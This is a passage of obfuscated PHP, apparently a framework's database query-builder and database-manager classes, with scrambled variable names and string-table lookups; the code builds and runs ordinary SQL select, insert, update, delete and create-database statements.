=& $_SERVER[şÒÁøÒÄ]; if (is_string($”õÏÍí) && strpos($”õÏÍí, $‰®ôø·[50])) { $”õÏÍí = explode($‰®ôø·[50], $”õÏÍí); } if (is_array($”õÏÍí)) { $šÂş×’Ç = array(); foreach ($”õÏÍí as $†ÂŠùÊ· => $ˆ‘ù•İ) { if (!is_numeric($†ÂŠùÊ·)) { $šÂş×’Ç[] = $this->parseKey($†ÂŠùÊ·, !1) . $‰®ôø·[1011] . $this->parseKey($ˆ‘ù•İ); } else { $šÂş×’Ç[] = $this->parseKey($ˆ‘ù•İ); } } $‚ØƒĞ×û = implode($‰®ôø·[50], $šÂş×’Ç); } elseif (is_string($”õÏÍí) && !empty($”õÏÍí)) { $‚ØƒĞ×û = $”õÏÍí; } else { $‚ØƒĞ×û = $‰®ôø·[189]; } return $‚ØƒĞ×û; } protected function parseTable($×¤•¿§²) { $Åàİø­ =& $_SERVER[şÒÁøÒÄ]; if (is_array($×¤•¿§²)) { $ı­¸±€ˆ = array(); foreach ($×¤•¿§² as $ñ¨ì‹Ü => $ç€ŠÚâ•) { if (!is_numeric($ñ¨ì‹Ü)) { $ı­¸±€ˆ[] = $this->parseKey($ñ¨ì‹Ü) . $Åàİø­[53] . $this->parseKey($ç€ŠÚâ•); } else { $ı­¸±€ˆ[] = $this->parseKey($ñ¨ì‹Ü); } } $×¤•¿§² = $ı­¸±€ˆ; } elseif (is_string($×¤•¿§²)) { if (strstr($×¤•¿§², $Åàİø­[53])) { return $×¤•¿§²; } $×¤•¿§² = explode($Åàİø­[50], $×¤•¿§²); array_walk($×¤•¿§², array($this, $Åàİø­[919])); } return $Åàİø­[913] . trim(implode($Åàİø­[1012], $×¤•¿§²), $Åàİø­[385]) . $Åàİø­[913]; } protected function parseWhere($ïÅ‡˜³§) { $ÖÜÃùùÔ =& $_SERVER[şÒÁøÒÄ]; $¾£ÖÄûÕ = $ÖÜÃùùÔ[12]; if (is_string($ïÅ‡˜³§)) { $¾£ÖÄûÕ = $ïÅ‡˜³§; } else { $“ù•ØˆÌ = isset($ïÅ‡˜³§[$ÖÜÃùùÔ[1013]]) ? strtoupper($ïÅ‡˜³§[$ÖÜÃùùÔ[1013]]) : $ÖÜÃùùÔ[12]; if (in_array($“ù•ØˆÌ, array($ÖÜÃùùÔ[1014], $ÖÜÃùùÔ[1015], $ÖÜÃùùÔ[1016]))) { $“ù•ØˆÌ = $ÖÜÃùùÔ[53] . $“ù•ØˆÌ . $ÖÜÃùùÔ[53]; unset($ïÅ‡˜³§[$ÖÜÃùùÔ[1013]]); } else { $“ù•ØˆÌ = $ÖÜÃùùÔ[1017]; } foreach ($ïÅ‡˜³§ as $ï€óâÌŞ => $ıîŠ¬«Í) { $¾£ÖÄûÕ .= $ÖÜÃùùÔ[277]; if (is_numeric($ï€óâÌŞ)) { $ï€óâÌŞ = $ÖÜÃùùÔ[1018]; } if (0 === strpos($ï€óâÌŞ, $ÖÜÃùùÔ[11])) { $¾£ÖÄûÕ .= $this->parseThinkWhere($ï€óâÌŞ, $ıîŠ¬«Í); } else { if (!preg_match($ÖÜÃùùÔ[1019], trim($ï€óâÌŞ))) { think_exception(think_lang($ÖÜÃùùÔ[1020]) . $ÖÜÃùùÔ[4] . $ï€óâÌŞ); } $¨Ÿ¾ıÛ¾ = is_array($ıîŠ¬«Í) && isset($ıîŠ¬«Í[$ÖÜÃùùÔ[1021]]); $ï€óâÌŞ = trim($ï€óâÌŞ); if (strpos($ï€óâÌŞ, $ÖÜÃùùÔ[283])) { $£çĞäÔ = explode($ÖÜÃùùÔ[283], $ï€óâÌŞ); $µš¥†¿İ = array(); foreach ($£çĞäÔ as $¯ú÷‚ªî => $œ¨çŠª‰) { $ØòéâØ¦ = $¨Ÿ¾ıÛ¾ ? $ıîŠ¬«Í[$¯ú÷‚ªî] : $ıîŠ¬«Í; $µš¥†¿İ[] = $ÖÜÃùùÔ[260] . $this->parseWhereItem($this->parseKey($œ¨çŠª‰), $ØòéâØ¦) . $ÖÜÃùùÔ[918]; } $¾£ÖÄûÕ .= implode($ÖÜÃùùÔ[1022], $µš¥†¿İ); } elseif (strpos($ï€óâÌŞ, $ÖÜÃùùÔ[284])) { $£çĞäÔ = explode($ÖÜÃùùÔ[284], $ï€óâÌŞ); $µš¥†¿İ = array(); foreach ($£çĞäÔ as $¯ú÷‚ªî => $œ¨çŠª‰) { $ØòéâØ¦ = $¨Ÿ¾ıÛ¾ ? $ıîŠ¬«Í[$¯ú÷‚ªî] : $ıîŠ¬«Í; $µš¥†¿İ[] = $ÖÜÃùùÔ[260] . $this->parseWhereItem($this->parseKey($œ¨çŠª‰), $ØòéâØ¦) . $ÖÜÃùùÔ[918]; } $¾£ÖÄûÕ .= implode($ÖÜÃùùÔ[1017], $µš¥†¿İ); } else { $¾£ÖÄûÕ .= $this->parseWhereItem($this->parseKey($ï€óâÌŞ), $ıîŠ¬«Í); } } $¾£ÖÄûÕ .= $ÖÜÃùùÔ[278] . $“ù•ØˆÌ; } $¾£ÖÄûÕ = substr($¾£ÖÄûÕ, 0, -strlen($“ù•ØˆÌ)); } return empty($¾£ÖÄûÕ) ? $ÖÜÃùùÔ[12] : $ÖÜÃùùÔ[1023] . $¾£ÖÄûÕ; } protected function parseWhereItem($Î¯ó³¼, $îÂÊè„) { $·Ù˜¨´Á =& $_SERVER[şÒÁøÒÄ]; $ÑƒÃÒ = $·Ù˜¨´Á[12]; if (is_array($îÂÊè„)) { if (is_string($îÂÊè„[0])) { $£ì‘½öç = strtolower($îÂÊè„[0]); if (in_array($îÂÊè„[0], array($·Ù˜¨´Á[897], $·Ù˜¨´Á[1024], $·Ù˜¨´Á[1025], $·Ù˜¨´Á[1026], $·Ù˜¨´Á[1027], $·Ù˜¨´Á[1028]))) { $ÑƒÃÒ .= $Î¯ó³¼ . $·Ù˜¨´Á[53] . $îÂÊè„[0] . $·Ù˜¨´Á[53] . $this->parseValue($îÂÊè„[1]); } elseif (preg_match($·Ù˜¨´Á[1029], $îÂÊè„[0])) { $ÑƒÃÒ .= $Î¯ó³¼ . $·Ù˜¨´Á[53] . $this->exp[$£ì‘½öç] . $·Ù˜¨´Á[53] . $this->parseValue($îÂÊè„[1]); } elseif (preg_match($·Ù˜¨´Á[1030], $îÂÊè„[0])) { if (is_array($îÂÊè„[1])) { $Çâ£”ä = isset($îÂÊè„[2]) ? strtoupper($îÂÊè„[2]) : $·Ù˜¨´Á[1015]; if (in_array($Çâ£”ä, array($·Ù˜¨´Á[1014], $·Ù˜¨´Á[1015], $·Ù˜¨´Á[1016]))) { $£©ÙˆĞ© = array(); foreach ($îÂÊè„[1] as $î¼æ»‹à) { $£©ÙˆĞ©[] = $Î¯ó³¼ . $·Ù˜¨´Á[53] . $this->exp[$£ì‘½öç] . $·Ù˜¨´Á[53] . $this->parseValue($î¼æ»‹à); } $ÑƒÃÒ .= $·Ù˜¨´Á[260] . implode($·Ù˜¨´Á[53] . $Çâ£”ä . $·Ù˜¨´Á[53], $£©ÙˆĞ©) . $·Ù˜¨´Á[918]; } } else { $ÑƒÃÒ .= $Î¯ó³¼ . $·Ù˜¨´Á[53] . $this->exp[$£ì‘½öç] . $·Ù˜¨´Á[53] . $this->parseValue($îÂÊè„[1]); } } elseif ($·Ù˜¨´Á[297] == $£ì‘½öç) { $ÑƒÃÒ .= $·Ù˜¨´Á[916] . $Î¯ó³¼ . $·Ù˜¨´Á[53] . $îÂÊè„[1] . $·Ù˜¨´Á[1031]; } elseif (preg_match($·Ù˜¨´Á[1032], $îÂÊè„[0])) { $ÑƒÃÒ .= $îÂÊè„[0]; } elseif (preg_match($·Ù˜¨´Á[1033], $îÂÊè„[0])) { if (isset($îÂÊè„[2]) && $·Ù˜¨´Á[297] == $îÂÊè„[2]) { $ÑƒÃÒ .= $Î¯ó³¼ . $·Ù˜¨´Á[53] . $this->exp[$£ì‘½öç] . $·Ù˜¨´Á[53] . $îÂÊè„[1]; } else { if (is_string($îÂÊè„[1])) { $îÂÊè„[1] = explode($·Ù˜¨´Á[50], $îÂÊè„[1]); } $¼¬ÎöÄ˜ = implode($·Ù˜¨´Á[50], $this->parseValue($îÂÊè„[1])); $ÑƒÃÒ .= $Î¯ó³¼ . $·Ù˜¨´Á[53] . $this->exp[$£ì‘½öç] . $·Ù˜¨´Á[916] . $¼¬ÎöÄ˜ . $·Ù˜¨´Á[918]; } } elseif (preg_match($·Ù˜¨´Á[1034], $îÂÊè„[0])) { $ó´£Ûğ¶ = is_string($îÂÊè„[1]) ? explode($·Ù˜¨´Á[50], $îÂÊè„[1]) : $îÂÊè„[1]; $ÑƒÃÒ .= $·Ù˜¨´Á[916] . $Î¯ó³¼ . $·Ù˜¨´Á[53] . $this->exp[$£ì‘½öç] . $·Ù˜¨´Á[53] . $this->parseValue($ó´£Ûğ¶[0]) . $·Ù˜¨´Á[1017] . $this->parseValue($ó´£Ûğ¶[1]) . $·Ù˜¨´Á[278]; } else { think_exception(think_lang($·Ù˜¨´Á[1020]) . $·Ù˜¨´Á[4] . $îÂÊè„[0]); } } else { $Éóœ¾“Ÿ = count($îÂÊè„); $÷µŞä± = $·Ù˜¨´Á[12]; if (is_string($îÂÊè„[$Éóœ¾“Ÿ - 1])) { $÷µŞä± = isset($îÂÊè„[$Éóœ¾“Ÿ - 1]) ? strtoupper($îÂÊè„[$Éóœ¾“Ÿ - 1]) : $·Ù˜¨´Á[12]; if (in_array($÷µŞä±, array($·Ù˜¨´Á[1014], $·Ù˜¨´Á[1015], $·Ù˜¨´Á[1016]))) { $Éóœ¾“Ÿ = $Éóœ¾“Ÿ - 1; } } else { $÷µŞä± = $·Ù˜¨´Á[1014]; } for ($ô§¯Ç²± = 0; $ô§¯Ç²± < $Éóœ¾“Ÿ; $ô§¯Ç²±++) { $ó´£Ûğ¶ = is_array($îÂÊè„[$ô§¯Ç²±]) ? $îÂÊè„[$ô§¯Ç²±][1] : $îÂÊè„[$ô§¯Ç²±]; if ($·Ù˜¨´Á[297] == strtolower($îÂÊè„[$ô§¯Ç²±][0])) { $ÑƒÃÒ .= $·Ù˜¨´Á[260] . $Î¯ó³¼ . $·Ù˜¨´Á[53] . $ó´£Ûğ¶ . $·Ù˜¨´Á[1031] . $÷µŞä± . $·Ù˜¨´Á[53]; } else { $óğò¯ï™ = is_array($îÂÊè„[$ô§¯Ç²±]) ? $this->exp[strtolower($îÂÊè„[$ô§¯Ç²±][0])] : $·Ù˜¨´Á[897]; if (!$óğò¯ï™ && is_array($îÂÊè„[$ô§¯Ç²±]) && in_array($îÂÊè„[$ô§¯Ç²±][0], array($·Ù˜¨´Á[897], $·Ù˜¨´Á[1024], $·Ù˜¨´Á[1025], $·Ù˜¨´Á[1026], $·Ù˜¨´Á[1027], $·Ù˜¨´Á[1028]))) { $óğò¯ï™ = $îÂÊè„[$ô§¯Ç²±][0]; } $ÑƒÃÒ .= $·Ù˜¨´Á[260] . $Î¯ó³¼ . $·Ù˜¨´Á[53] . $óğò¯ï™ . $·Ù˜¨´Á[53] . $this->parseValue($ó´£Ûğ¶) . $·Ù˜¨´Á[1031] . $÷µŞä± . $·Ù˜¨´Á[53]; } } $ÑƒÃÒ = substr($ÑƒÃÒ, 0, -4); } } else { $ÑƒÃÒ .= $Î¯ó³¼ . $·Ù˜¨´Á[1035] . $this->parseValue($îÂÊè„); } return $ÑƒÃÒ; } protected function parseThinkWhere($ó©ú®‰, $ÚôÂ™ä‰) { $˜áèº‰÷ =& $_SERVER[şÒÁøÒÄ]; $ùñ¦êÇ“ = $˜áèº‰÷[12]; switch ($ó©ú®‰) { case $˜áèº‰÷[352]: $ùñ¦êÇ“ = $ÚôÂ™ä‰; break; case $˜áèº‰÷[1018]: $ùñ¦êÇ“ = is_string($ÚôÂ™ä‰) ? $ÚôÂ™ä‰ : substr($this->parseWhere($ÚôÂ™ä‰), 6); break; case $˜áèº‰÷[1036]: parse_str($ÚôÂ™ä‰, $ŸÖäû’Ø); if (isset($ŸÖäû’Ø[$˜áèº‰÷[1013]])) { $åóù×í  = $˜áèº‰÷[53] . strtoupper($ŸÖäû’Ø[$˜áèº‰÷[1013]]) . $˜áèº‰÷[53]; unset($ŸÖäû’Ø[$˜áèº‰÷[1013]]); } else { $åóù×í  = $˜áèº‰÷[1017]; } $‡·­‹«¤ = array(); foreach ($ŸÖäû’Ø as $óáÊ„” => $õ×ğÀ›ş) { $‡·­‹«¤[] = $this->parseKey($óáÊ„”) . $˜áèº‰÷[1035] . $this->parseValue($õ×ğÀ›ş); } $ùñ¦êÇ“ = implode($åóù×í , $‡·­‹«¤); break; } return $ùñ¦êÇ“; } protected function parseLimit($š¶Œ…‘Ê) { $áÂÍßñß =& $_SERVER[şÒÁøÒÄ]; return !empty($š¶Œ…‘Ê) ? $áÂÍßñß[51] . $š¶Œ…‘Ê . $áÂÍßñß[53] : $áÂÍßñß[12]; } protected function parseJoin($º®¿¢Üğ) { $òëÙ‚ë =& $_SERVER[şÒÁøÒÄ]; $şœà¬íˆ = $òëÙ‚ë[12]; if (!empty($º®¿¢Üğ)) { if (is_array($º®¿¢Üğ)) { foreach ($º®¿¢Üğ as $è²‡âñà => $¸ëÀÛ§²) { if (!1 !== stripos($¸ëÀÛ§², $òëÙ‚ë[1037])) { $şœà¬íˆ .= $òëÙ‚ë[53] . $¸ëÀÛ§²; } else { $şœà¬íˆ .= $òëÙ‚ë[1038] . $¸ëÀÛ§²; } } } else { $şœà¬íˆ .= $òëÙ‚ë[1038] . $º®¿¢Üğ; } } $şœà¬íˆ = preg_replace($òëÙ‚ë[1039], think_config($òëÙ‚ë[943]) . $òëÙ‚ë[1040], $şœà¬íˆ); return $şœà¬íˆ; } protected function parseOrder($ˆÆëÏ¥–) { $µåêùÒ¤ =& $_SERVER[şÒÁøÒÄ]; if (is_array($ˆÆëÏ¥–)) { $¦©‡ïÊ = array(); foreach ($ˆÆëÏ¥– as $Â‘ÀçÉæ => $”úŸ—­) { if (is_numeric($Â‘ÀçÉæ)) { $¦©‡ïÊ[] = $this->parseKey($”úŸ—­); } else { $”úŸ—­ = in_array(strtoupper(trim($”úŸ—­)), array($µåêùÒ¤[1041], $µåêùÒ¤[1042])) ? $µåêùÒ¤[53] . $”úŸ—­ : $µåêùÒ¤[12]; if (preg_match($µåêùÒ¤[1043], $Â‘ÀçÉæ)) { $¦©‡ïÊ[] = $this->parseKey($Â‘ÀçÉæ) . $”úŸ—­; } else { think_exception($µåêùÒ¤[1044] . $Â‘ÀçÉæ); } } } $ˆÆëÏ¥– = implode($µåêùÒ¤[50], $¦©‡ïÊ); } return !empty($ˆÆëÏ¥–) ? $µåêùÒ¤[1045] . $ˆÆëÏ¥– : $µåêùÒ¤[12]; } protected function parseGroup($Û¸‰‡úî) { $†½ÒÃ‹º =& $_SERVER[şÒÁøÒÄ]; return !empty($Û¸‰‡úî) ? $†½ÒÃ‹º[1046] . $Û¸‰‡úî : $†½ÒÃ‹º[12]; } protected function parseHaving($©Éœê•é) { $Á©Í¬“‘ =& $_SERVER[şÒÁøÒÄ]; return !empty($©Éœê•é) ? $Á©Í¬“‘[1047] . $©Éœê•é : $Á©Í¬“‘[12]; } protected function parseComment($éÒ¾Ğ) { $çÕúßı =& $_SERVER[şÒÁøÒÄ]; return !empty($éÒ¾Ğ) ? $çÕúßı[1048] . $éÒ¾Ğ . $çÕúßı[1049] : $çÕúßı[12]; } protected function parseDistinct($¡¨ÈáÕ–) { $®«¤èĞ³ =& $_SERVER[şÒÁøÒÄ]; return !empty($¡¨ÈáÕ–) ? $®«¤èĞ³[1050] : $®«¤èĞ³[12]; } protected function parseUnion($è¥¤•Ğ) { $ª¾ö¬‘ =& $_SERVER[şÒÁøÒÄ]; if (empty($è¥¤•Ğ)) { return $ª¾ö¬‘[12]; } if (isset($è¥¤•Ğ[$ª¾ö¬‘[348]])) { $«µ£Ş¶ = $ª¾ö¬‘[1051]; unset($è¥¤•Ğ[$ª¾ö¬‘[348]]); } else { $«µ£Ş¶ = $ª¾ö¬‘[1052]; } foreach ($è¥¤•Ğ as $½ºÆ¦î‘) { $°¬±Öº[] = $«µ£Ş¶ . (is_array($½ºÆ¦î‘) ? $this->buildSelectSql($½ºÆ¦î‘) : $½ºÆ¦î‘); } return implode($ª¾ö¬‘[53], $°¬±Öº); } public function insert($´õÄæ©, $±Ä¸³¦Ğ = array(), $á²òÃä¤ = false) { $áıæ¥¨ =& $_SERVER[şÒÁøÒÄ]; $ô‚”›¼ = $ÃçÑùúÚ = array(); $this->model = $±Ä¸³¦Ğ[$áıæ¥¨[281]]; foreach ($´õÄæ© as $àèÉÈ => $Ëş‚Ëœˆ) { if (is_array($Ëş‚Ëœˆ) && $áıæ¥¨[297] == $Ëş‚Ëœˆ[0]) { $ÃçÑùúÚ[] = $this->parseKey($àèÉÈ); $ô‚”›¼[] = $Ëş‚Ëœˆ[1]; } elseif (is_scalar($Ëş‚Ëœˆ) || is_null($Ëş‚Ëœˆ)) { $ÃçÑùúÚ[] = $this->parseKey($àèÉÈ); $ô‚”›¼[] = $this->parseValue($Ëş‚Ëœˆ); } } $×ìÀï¼ = ($á²òÃä¤ ? $áıæ¥¨[920] : $áıæ¥¨[921]) . $áıæ¥¨[922] . $this->parseTable($±Ä¸³¦Ğ[$áıæ¥¨[279]]) . $áıæ¥¨[916] . implode($áıæ¥¨[50], $ÃçÑùúÚ) . $áıæ¥¨[917] . implode($áıæ¥¨[50], $ô‚”›¼) . $áıæ¥¨[918]; $×ìÀï¼ .= $this->parseLock(isset($±Ä¸³¦Ğ[$áıæ¥¨[851]]) ? $±Ä¸³¦Ğ[$áıæ¥¨[851]] : !1); $×ìÀï¼ .= $this->parseComment(!empty($±Ä¸³¦Ğ[$áıæ¥¨[354]]) ? $±Ä¸³¦Ğ[$áıæ¥¨[354]] : $áıæ¥¨[12]); return $this->execute($×ìÀï¼, $this->parseBind(!empty($±Ä¸³¦Ğ[$áıæ¥¨[285]]) ? $±Ä¸³¦Ğ[$áıæ¥¨[285]] : array())); } public function selectInsert($Ò°ÆÈÚÛ, $«ôáß, $—Ê§é‹œ = array()) { $‘ÃÜÃ =& $_SERVER[şÒÁøÒÄ]; $this->model = $—Ê§é‹œ[$‘ÃÜÃ[281]]; if (is_string($Ò°ÆÈÚÛ)) { $Ò°ÆÈÚÛ = explode($‘ÃÜÃ[50], $Ò°ÆÈÚÛ); } array_walk($Ò°ÆÈÚÛ, array($this, $‘ÃÜÃ[919])); $¼©ñÒ’Ë = $‘ÃÜÃ[1053] . $this->parseTable($«ôáß) . $‘ÃÜÃ[916] . implode($‘ÃÜÃ[50], $Ò°ÆÈÚÛ) . $‘ÃÜÃ[1031]; $¼©ñÒ’Ë .= $this->buildSelectSql($—Ê§é‹œ); return $this->execute($¼©ñÒ’Ë, $this->parseBind(!empty($—Ê§é‹œ[$‘ÃÜÃ[285]]) ? $—Ê§é‹œ[$‘ÃÜÃ[285]] : array())); } public function update($ãÛ‹ƒêŞ, $‹Š÷·†) { $…¥¶ÑÔ» =& $_SERVER[şÒÁøÒÄ]; $this->model = $‹Š÷·†[$…¥¶ÑÔ»[281]]; $³â›öêÅ = $…¥¶ÑÔ»[1054] . $this->parseTable($‹Š÷·†[$…¥¶ÑÔ»[279]]) . $this->parseSet($ãÛ‹ƒêŞ) . $this->parseWhere(!empty($‹Š÷·†[$…¥¶ÑÔ»[275]]) ? $‹Š÷·†[$…¥¶ÑÔ»[275]] : $…¥¶ÑÔ»[12]) . $this->parseOrder(!empty($‹Š÷·†[$…¥¶ÑÔ»[365]]) ? $‹Š÷·†[$…¥¶ÑÔ»[365]] : $…¥¶ÑÔ»[12]) . $this->parseLimit(!empty($‹Š÷·†[$…¥¶ÑÔ»[292]]) ? $‹Š÷·†[$…¥¶ÑÔ»[292]] : $…¥¶ÑÔ»[12]) . $this->parseLock(isset($‹Š÷·†[$…¥¶ÑÔ»[851]]) ? $‹Š÷·†[$…¥¶ÑÔ»[851]] : !1) . $this->parseComment(!empty($‹Š÷·†[$…¥¶ÑÔ»[354]]) ? $‹Š÷·†[$…¥¶ÑÔ»[354]] : $…¥¶ÑÔ»[12]); return $this->execute($³â›öêÅ, $this->parseBind(!empty($‹Š÷·†[$…¥¶ÑÔ»[285]]) ? $‹Š÷·†[$…¥¶ÑÔ»[285]] : array())); } public function delete($ôä½Æ×ë = array()) { $ëÓÊ‚û¿ =& $_SERVER[şÒÁøÒÄ]; $this->model = $ôä½Æ×ë[$ëÓÊ‚û¿[281]]; $›€¶‚¾ä = $ëÓÊ‚û¿[1055] . $this->parseTable($ôä½Æ×ë[$ëÓÊ‚û¿[279]]) . $this->parseWhere(!empty($ôä½Æ×ë[$ëÓÊ‚û¿[275]]) ? $ôä½Æ×ë[$ëÓÊ‚û¿[275]] : $ëÓÊ‚û¿[12]) . $this->parseOrder(!empty($ôä½Æ×ë[$ëÓÊ‚û¿[365]]) ? $ôä½Æ×ë[$ëÓÊ‚û¿[365]] : $ëÓÊ‚û¿[12]) . $this->parseLimit(!empty($ôä½Æ×ë[$ëÓÊ‚û¿[292]]) ? $ôä½Æ×ë[$ëÓÊ‚û¿[292]] : $ëÓÊ‚û¿[12]) . $this->parseLock(isset($ôä½Æ×ë[$ëÓÊ‚û¿[851]]) ? $ôä½Æ×ë[$ëÓÊ‚û¿[851]] : !1) . $this->parseComment(!empty($ôä½Æ×ë[$ëÓÊ‚û¿[354]]) ? $ôä½Æ×ë[$ëÓÊ‚û¿[354]] : $ëÓÊ‚û¿[12]); return $this->execute($›€¶‚¾ä, $this->parseBind(!empty($ôä½Æ×ë[$ëÓÊ‚û¿[285]]) ? $ôä½Æ×ë[$ëÓÊ‚û¿[285]] : array())); } public function select($Š‚ÕÊ » = array()) { $ªÀ¡×Í  =& $_SERVER[şÒÁøÒÄ]; $this->model = $Š‚ÕÊ »[$ªÀ¡×Í [281]]; $ğöóùúË = $this->buildSelectSql($Š‚ÕÊ »); $Áí‹ôî = isset($Š‚ÕÊ »[$ªÀ¡×Í [349]]) ? $Š‚ÕÊ »[$ªÀ¡×Í [349]] : !1; if ($Áí‹ôî) { $€¾ò‚Ğ· = is_string($Áí‹ôî[$ªÀ¡×Í [94]]) ? $Áí‹ôî[$ªÀ¡×Í [94]] : $ªÀ¡×Í [1056] . md5($ğöóùúË); $µı…ïıÎ = think_cache($€¾ò‚Ğ·, $ªÀ¡×Í [12], $Áí‹ôî); if (!1 !== $µı…ïıÎ) { return $µı…ïıÎ; } } $…Æó™Ò = $this->query($ğöóùúË, $this->parseBind(!empty($Š‚ÕÊ »[$ªÀ¡×Í [285]]) ? $Š‚ÕÊ »[$ªÀ¡×Í [285]] : array())); if ($Áí‹ôî && !1 !== $…Æó™Ò) { think_cache($€¾ò‚Ğ·, $…Æó™Ò, $Áí‹ôî); } return $…Æó™Ò; } public function buildSelectSql($Íìøö¬± = array()) { $ïú‰Ó– =& $_SERVER[şÒÁøÒÄ]; if (isset($Íìøö¬±[$ïú‰Ó–[353]])) { if (strpos($Íìøö¬±[$ïú‰Ó–[353]], $ïú‰Ó–[50])) { list($‚“Ášğƒ, $±ÛéŸ´) = explode($ïú‰Ó–[50], $Íìøö¬±[$ïú‰Ó–[353]]); } else { $‚“Ášğƒ = $Íìøö¬±[$ïú‰Ó–[353]]; } $‚“Ášğƒ = $‚“Ášğƒ ? $‚“Ášğƒ : 1; $±ÛéŸ´ = isset($±ÛéŸ´) ? $±ÛéŸ´ : (is_numeric($Íìøö¬±[$ïú‰Ó–[292]]) ? $Íìøö¬±[$ïú‰Ó–[292]] : 20); $Ğ³öÖÙ£ = $±ÛéŸ´ * ((int) $‚“Ášğƒ - 1); $Íìøö¬±[$ïú‰Ó–[292]] = $Ğ³öÖÙ£ . $ïú‰Ó–[50] . $±ÛéŸ´; } if (think_config($ïú‰Ó–[1057])) { $¿´®–ç— = $ïú‰Ó–[1058] . md5(serialize($Íìøö¬±)); $ğ‚‰„… = think_cache($¿´®–ç—); if ($ğ‚‰„…) { return $ğ‚‰„…; } } $‡¤†µçú = $this->parseSql($this->selectSql, $Íìøö¬±); $‡¤†µçú .= $this->parseLock(isset($Íìøö¬±[$ïú‰Ó–[851]]) ? $Íìøö¬±[$ïú‰Ó–[851]] : !1); if (isset($¿´®–ç—)) { think_cache($¿´®–ç—, $‡¤†µçú); } return $‡¤†µçú; } public function parseSql($èØ²º„, $£ŸÎ÷éò = array()) { $Ø…§ü¢† =& $_SERVER[şÒÁøÒÄ]; $èØ²º„ = str_replace(array($Ø…§ü¢†[1059], $Ø…§ü¢†[1060], $Ø…§ü¢†[1061], $Ø…§ü¢†[1062], $Ø…§ü¢†[1063], $Ø…§ü¢†[1064], $Ø…§ü¢†[1065], $Ø…§ü¢†[1066], $Ø…§ü¢†[1067], $Ø…§ü¢†[1068], $Ø…§ü¢†[1069]), array($this->parseTable("{$£ŸÎ÷éò[$Ø…§ü¢†[279]]}"), $this->parseDistinct(isset($£ŸÎ÷éò[$Ø…§ü¢†[1070]]) ? $£ŸÎ÷éò[$Ø…§ü¢†[1070]] : !1), $this->parseField(!empty($£ŸÎ÷éò[$Ø…§ü¢†[273]]) ? $£ŸÎ÷éò[$Ø…§ü¢†[273]] : $Ø…§ü¢†[189]), $this->parseJoin(!empty($£ŸÎ÷éò[$Ø…§ü¢†[282]]) ? $£ŸÎ÷éò[$Ø…§ü¢†[282]] : $Ø…§ü¢†[12]), $this->parseWhere(!empty($£ŸÎ÷éò[$Ø…§ü¢†[275]]) ? $£ŸÎ÷éò[$Ø…§ü¢†[275]] : $Ø…§ü¢†[12]), $this->parseGroup(!empty($£ŸÎ÷éò[$Ø…§ü¢†[505]]) ? $£ŸÎ÷éò[$Ø…§ü¢†[505]] : $Ø…§ü¢†[12]), $this->parseHaving(!empty($£ŸÎ÷éò[$Ø…§ü¢†[1071]]) ? $£ŸÎ÷éò[$Ø…§ü¢†[1071]] : $Ø…§ü¢†[12]), $this->parseOrder(!empty($£ŸÎ÷éò[$Ø…§ü¢†[365]]) ? $£ŸÎ÷éò[$Ø…§ü¢†[365]] : $Ø…§ü¢†[12]), $this->parseLimit(!empty($£ŸÎ÷éò[$Ø…§ü¢†[292]]) ? $£ŸÎ÷éò[$Ø…§ü¢†[292]] : $Ø…§ü¢†[12]), $this->parseUnion(!empty($£ŸÎ÷éò[$Ø…§ü¢†[347]]) ? $£ŸÎ÷éò[$Ø…§ü¢†[347]] : $Ø…§ü¢†[12]), $this->parseComment(!empty($£ŸÎ÷éò[$Ø…§ü¢†[354]]) ? $£ŸÎ÷éò[$Ø…§ü¢†[354]] : $Ø…§ü¢†[12])), $èØ²º„); return $èØ²º„; } public function getLastSql($ıÚ‘êĞ² = '') { return $ıÚ‘êĞ² ? $this->modelSql[$ıÚ‘êĞ²] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($ÚâÃ„ÁŞ) { return addslashes($ÚâÃ„ÁŞ); } public function setModel($ÚĞ«¨°Ç) { $this->model = $ÚĞ«¨°Ç; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($ºŞîƒ = array()) { $üú®¸“³ =& $_SERVER[şÒÁøÒÄ]; if (empty($ºŞîƒ)) { $ºŞîƒ = $GLOBALS[$üú®¸“³[6]][$üú®¸“³[21]]; } $this->database = $ºŞîƒ; } public function model($ìï£üî¡ = '') { return new ModelBase($ìï£üî¡, $_SERVER[şÒÁøÒÄ][12], $this->database); } public function db($¥Ì‚Êô± = false) { $Š à´Õ¼ =& $_SERVER[şÒÁøÒÄ]; $ˆÔÂ„ñ = array_change_key_case($this->database); if ($this->dbType() == $Š à´Õ¼[13] || !$¥Ì‚Êô±) { return $this->model()->db(); } $ù¼´ªà = $ˆÔÂ„ñ[$Š à´Õ¼[985]]; $ˆÔÂ„ñ[$Š à´Õ¼[985]] = $Š à´Õ¼[12]; if ($ˆÔÂ„ñ[$Š à´Õ¼[980]] == $Š à´Õ¼[977]) { $ÔÖ¤¿õü = $ˆÔÂ„ñ[$Š à´Õ¼[986]]; $ˆÔÂ„ñ[$Š à´Õ¼[986]] = substr($ÔÖ¤¿õü, 0, strrpos($ÔÖ¤¿õü, $Š à´Õ¼[1072])); } $this->database = $ˆÔÂ„ñ; $÷õª´Š˜ = $this->model()->db(); try { $ûÕééÜ = $÷õª´Š˜->execute("\x73\150\157\x77\x20\144\x61\x74\141\x62\x61\163\145\x73\40\154\x69\153\x65\40\47{$ù¼´ªà}\47"); } catch (Exception $©Üí) { } if (!$ûÕééÜ) { $÷õª´Š˜->execute("\143\162\x65\141\x74\x65\x20\144\141\x74\x61\x62\141\x73\x65\x20\140{$ù¼´ªà}\x60"); } $ˆÔÂ„ñ[$Š à´Õ¼[985]] = $ù¼´ªà; if ($ˆÔÂ„ñ[$Š à´Õ¼[980]] == $Š à´Õ¼[977]) { $ˆÔÂ„ñ[$Š à´Õ¼[986]] .= $Š à´Õ¼[1072] . $ù¼´ªà; } $this->database = $ˆÔÂ„ñ; $÷õª´Š˜->execute("\x75\x73\x65\40\140{$ù¼´ªà}\x60"); return $÷õª´Š˜; } public function createTable($ñÔï‡¥, &$ÜêäÜ‚Ë) { $ÜÆØÉı† =& $_SERVER[şÒÁøÒÄ]; if (!IO::exist($ñÔï‡¥)) { ActionCall($ÜÆØÉı†[1073], !0, 0); show_json(LNG($ÜÆØÉı†[1074]), !1); } $˜¡ŒÀ·Ä = $this->model()->db(); $€ª´¾Á³ = sqlSplit(IO::getContent($ñÔï‡¥)); foreach ($€ª´¾Á³ as $í™®úêÒ) { $ÙÅÎ¼øâ = stripos($í™®úêÒ, $ÜÆØÉı†[1075]) === 0; if 